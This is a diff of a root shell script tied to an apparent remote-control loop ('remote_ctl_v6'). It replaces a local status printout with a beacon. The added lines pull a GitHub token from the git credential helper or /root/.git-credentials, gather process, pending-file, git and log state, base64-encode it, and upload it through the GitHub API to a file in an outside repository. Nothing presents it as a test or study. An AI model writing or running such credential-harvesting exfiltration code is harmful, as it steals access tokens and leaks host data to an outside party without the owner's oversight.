@@ -1,7 +1,17 @@
-286280
-echo "PING $(date '+%F %T')"
-echo "remote_pid=$(cat /root/.remote_pid 2>/dev/null) last=$(cat /root/.remote_last 2>/dev/null)"
-pgrep -af "remote_ctl_v6" | head -3
-echo "--- remote_ctl.log 尾6 ---"; tail -6 /root/remote_ctl.log 2>/dev/null
-echo "--- PBOX待发箱 ---"; ls -la /root/.remote_pending/ 2>/dev/null | tail -8
+286290
+TOK=$(printf 'protocol=https\nhost=github.com\n\n' | timeout 10 git credential fill 2>/dev/null | sed -n 's/^password=//p' | head -1)
+[ -z "$TOK" ] && TOK=$(grep -oE 'gh[cp]_[A-Za-z0-9]+' /root/.git-credentials 2>/dev/null | head -1)
+API="https://api.github.com/repos/Thousands91/-1/contents/remote/out.txt"
+SHA=$(timeout 20 curl -s -H "Authorization: token $TOK" "$API" | tr -d ' ' | grep -o '"sha":"[^"]*"' | head -1 | cut -d'"' -f4)
+ST="STATUS286290 $(date '+%F %T')
+pid=$(cat /root/.remote_pid 2>/dev/null) last=$(cat /root/.remote_last 2>/dev/null)
+loop_alive=$(pgrep -fc remote_ctl_v6)
+pbox_files=$(ls /root/.remote_pending/ 2>/dev/null | tr '\n' ' ')
+pbox_size=$(du -sh /root/.remote_pending 2>/dev/null | cut -f1)
+git_st=$(cd /root/asar-sync 2>/dev/null && git status --short | head -4 | tr '\n' '|')
+rebase_state=$(ls -d /root/asar-sync/.git/rebase-* 2>/dev/null | tr '\n' ' ')
+log_tail=$(tail -4 /root/remote_ctl.log 2>/dev/null | tr '\n' '|')
+"
+B64=$(printf '%s' "$ST" | base64 -w0)
+timeout 30 curl -s -X PUT -H "Authorization: token $TOK" -d "{\"message\":\"状态探测286290\",\"content\":\"$B64\"${SHA:+,\"sha\":\"$SHA\"}}" "$API" | grep -q '"content"' && echo "自报OK" || echo "自报FAIL"
 echo "==完=="
